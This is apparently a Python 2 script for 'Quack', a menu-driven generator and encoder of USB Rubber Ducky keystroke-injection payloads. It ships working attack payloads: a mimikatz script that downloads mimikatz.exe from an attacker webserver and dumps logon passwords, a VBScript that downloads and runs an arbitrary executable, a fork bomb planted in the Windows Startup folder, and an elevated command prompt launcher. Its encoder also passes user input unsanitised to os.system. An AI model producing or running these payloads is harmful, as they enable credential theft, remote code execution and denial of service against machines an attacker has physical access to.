############## Python Modules ##############
#!/usr/bin/python
import os, sys, platform
from time import sleep
import time

############### PAYLOADS ########################
fork = """CONTROL ESCAPE
DELAY 300
STRING cmd
DELAY 200
MENU
DELAY 100
STRING a
ENTER
DELAY 200
LEFT
ENTER
DELAY 1000
STRING cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
ENTER
STRING copy con a.bat
ENTER
STRING @echo off
ENTER
STRING :START
ENTER
STRING start a.bat 
ENTER
STRING GOTO START
ENTER
CONTROL z
ENTER
STRING a.bat
ENTER
ALT F4
"""
download = """DELAY 300
ESCAPE
CONTROL ESCAPE
DELAY 400
STRING cmd
DELAY 400
ENTER
DELAY 400
STRING copy con download.vbs
ENTER
STRING Set args = WScript.Arguments:a = split(args(0), "/")(UBound(split(args(0),"/")))
ENTER
STRING Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"):objXMLHTTP.open "GET", args(0), false:objXMLHTTP.send()
ENTER
STRING If objXMLHTTP.Status = 200 Then
ENTER
STRING Set objADOStream = CreateObject("ADODB.Stream"):objADOStream.Open
ENTER
STRING objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0
ENTER
STRING Set objFSO = Createobject("Scripting.FileSystemObject"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a
ENTER
STRING objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing 
ENTER
STRING End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing
ENTER
CTRL z
ENTER
STRING cscript download.vbs <INSERT URL HERE>
ENTER
STRING <INSERT EXE FILENAME HERE>
ENTER
STRING exit
ENTER
"""
helloworld = """DELAY 300
GUI r
DELAY 100
STRING notepad
ENTER
DELAY 100
STRING Hello World!!!
ENTER
"""
admin = """DELAY 1000
REM get a admin cmd prompt
CONTROL ESCAPE
DELAY 300
STRING cmd
DELAY 300
REM the admin part booyah
CTRL-SHIFT ENTER
DELAY 500
ALT y
DELAY 300
ENTER
"""
mimikatz = """REM mimikatz ducky script to dump local wdigest passwords from memory using mimikatz (local user needs to be an administrator/have admin privs)
DELAY 1000
CONTROL ESCAPE
DELAY 500
STRING cmd
DELAY 1000
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 300
ENTER
STRING powershell (new-object System.Net.WebClient).DownloadFile('http://<replace me with webserver ip/host>/mimikatz.exe','%TEMP%\mimikatz.exe')
DELAY 300
ENTER
DELAY 3000
STRING %TEMP%\mimikatz.exe
DELAY 300
ENTER
DELAY 3000
STRING privilege::debug
DELAY 300
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full
DELAY 300
ENTER
DELAY 1000
STRING exit
DELAY 300
ENTER
DELAY 100
STRING del %TEMP%\mimikatz.exe
DELAY 300
ENTER
"""



############## Global Color Vars ##############

# Standard Colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
LR = '\033[1;31m' # light red
LG = '\033[1;32m' # light green
LO = '\033[1;33m' # light orange
LB = '\033[1;34m' # light blue
LP = '\033[1;35m' # light purple
LC = '\033[1;36m' # light cyan

################# DEF  MAINS ########################################

def help():
    print """
Ducky Commands:
   ALT [key name] (ex: ALT F4, ALT SPACE)
   CTRL | CONTROL [key name] (ex: CTRL ESC)
   CTRL-ALT [key name] (ex: CTRL-ALT DEL)
   CTRL-SHIFT [key name] (ex: CTRL-SHIFT ESC)
   DEFAULT_DELAY | DEFAULTDELAY [Time in millisecond * 10] (change the delay between each command)
   DELAY [Time in millisecond * 10] (used to overide temporary the default delay)
   GUI | WINDOWS [key name] (ex: GUI r, GUI l)
   REM [anything] (used to comment your code, no obligation :) )
   ALT-SHIFT (swap language)
   SHIFT [key name] (ex: SHIFT DEL)
   STRING [any character of your layout]
   REPEAT [Number] (Repeat last instruction N times)
   [key name] (anything in the keyboard.properties)
"""
def script():
    print "Type your code here (hit ENTER to go to a new line) and when your done type DONE in all caps on a new line."
    def scriptss():
        scripts = raw_input(">")
        while scripts != 'DONE':
            FILE = open("ducky-custom.txt","a+")
            FILE.write(scripts + "\n")
            FILE.close()
            scriptss()
        if scripts == "DONE":
	    print "[*] Generated payload!"
            FILE = open("ducky-custom.txt","a+")
            for line in FILE.readlines():
                cleaned_line = line.replace(scripts,"")
            FILE.close()
            if platform.system() == "Windows":
	        os.system("duckencoder.jar -i ducky-custom.txt -o ducky-custom.bin")
	        print  "[*] Successfully encoded!"
	    elif platform.system() == "Linux":
	        os.system("java -jar duckencoder.jar -i ducky-custom.txt -o ducky-custom.bin")
	        print  "[*] Successfully encoded!"
            time.sleep(2)
            sys.exit(1)
    scriptss()

def encode():
    print "Include .txt and .bin in file names"
    encode = raw_input("[>] Text file to be encoded: ")
    print "Remember, for the script to work, it has to be called inject.bin"
    output = raw_input("[>] Output file: ")
    if platform.system() == "Windows":
        os.system("duckencoder.jar -i " + encode + " -o " + output)
	print  "[*] Successfully encoded!"
    elif platform.system() == "Linux":
	os.system("java -jar duckencoder.jar -i " + encode + " -o " + output)
	print  "[*] Successfully encoded!"
    time.sleep(2)


def upload():
    while True:
        print ""
        print "-------------------------------------------------"
        print "[1] Mimikatz Cred Harvester"
        print "Find passwords with mimkatz"
        print "-------------------------------------------------"
        print "[2] Simple Hello World"
        print "Opens notepad and types Hello World!!!"
        print "-------------------------------------------------"
        print "[3] Fork Bomb (Win7) "
        print "Makes and then executes a fork bomb"
        print "-------------------------------------------------"
        print "[4] Admin Command Prompt"
        print "Opens an cmd in admin without the admin password"
        print "-------------------------------------------------"
        print "[5] Download a file"
        print "Download and then execute a given .exe"
        print "-------------------------------------------------"
        print "[6] Exit"
        print "Exit and go to the main menu"
        print "-------------------------------------------------"

        script = raw_input("[>] Which script: ")

        if script == "1":
            FILE = open("ducky-mimikatz.txt","a+")
            FILE.write(mimikatz)
            FILE.close()
	    print "[*] Generated payload!"
	    time.sleep(2)
	    if platform.system() == "Windows":
	        os.system("duckencoder.jar -i ducky-mimikatz.txt -o ducky-mimikatz.bin")
	        print  "[*] Successfully encoded!"
	    elif platform.system() == "Linux":
	        os.system("java -jar duckencoder.jar -i ducky-mimikatz.txt -o ducky-mimikatz.bin")
	        print  "[*] Successfully encoded!"
        elif script == "2":
            FILE = open("ducky-helloworld.txt","a+") 
            FILE.write(helloworld)
            FILE.close()
	    print "[*] Generated payload!"
	    if platform.system() == "Windows":
	        os.system("duckencoder.jar -i ducky-helloworld.txt -o ducky-helloworld.bin")
	        print  "[*] Successfully encoded!"
	    elif platform.system() == "Linux":
	        os.system("java -jar duckencoder.jar -i ducky-helloworld.txt -o ducky-helloworld.bin")
	        print  "[*] Successfully encoded!"
        elif script == "3":
            FILE = open("ducky-fork.txt","a+")
            FILE.write(fork)
            FILE.close()
	    print  "[*] Generated payload!"
	    if platform.system() == "Windows":
	        os.system("duckencoder.jar -i ducky-fork.txt -o ducky-fork.bin")
	        print  "[*] Successfully encoded!"
	    elif platform.system() == "Linux":
	        os.system("java -jar duckencoder.jar -i ducky-fork.txt -o ducky-fork.bin")
	        print  "[*] Successfully encoded!"
        elif script == "4":
            FILE = open("ducky-admin-cmd.txt","a+")
            FILE.write(admin)
            FILE.close()
	    print "[*] Generated payload!"
	    if platform.system() == "Windows":
	        os.system("duckencoder.jar -i ducky-admin-cmd.txt -o ducky-admin-cmd.bin")
	        print  "[*] Successfully encoded!"
	    elif platform.system() == "Linux":
	        os.system("java -jar duckencoder.jar -i ducky-admin-cmd.txt -o ducky-admin-cmd.bin")
	        print  "[*] Successfully encoded!"
        elif script == "5":
            FILE = open("ducky-download.txt","a+")
            FILE.write(download)
            FILE.close()
	    print  "[*] Generated payload!"
	    if platform.system() == "Windows":
	        os.system("duckencoder.jar -i ducky-download.txt -o ducky-download.bin")
	        print  "[*] Successfully encoded!"
	    elif platform.system() == "Linux":
	        os.system("java -jar duckencoder.jar -i ducky-download.txt -o ducky-download.bin")
	        print  "[*] Successfully encoded!"
        elif script == "6":
            break

######################################################




header1 = """

       ..---.. 
     .'  _    `. 
 __..'  (o)    : 
`..__          ; 
     `.       / 
       ;      `..---...___ 
     .'                   `~-. .-') 
    .                         ' _.' 
   :                           : 
   \                           ' 
    +                         J 
     `._                   _.' 
        `~--....___...---~' 
"""
header2 = """
   ---------------------------
       Welcome to Quack!
      Where hacks come true!
   ---------------------------

    Developed By: @_t0x1c
         Thanks Hak5!
"""
########################### Main ###########################

while True:
    print header1
    print header2
    print "====================================="
    print "1. Download pre-made scripts"
    print "2. Make Ducky script from scratch"
    print "3. Encode a payload"
    print "4. Help"
    print "=====================================" 

    main = raw_input("(>) Select Option: " )
    if main == "1":
        upload()
    elif main == "2":
        script()
    elif main == "3":
        encode()
    elif main == "4":
        help()
    else:
        print  "Did not get that!" 
        continue
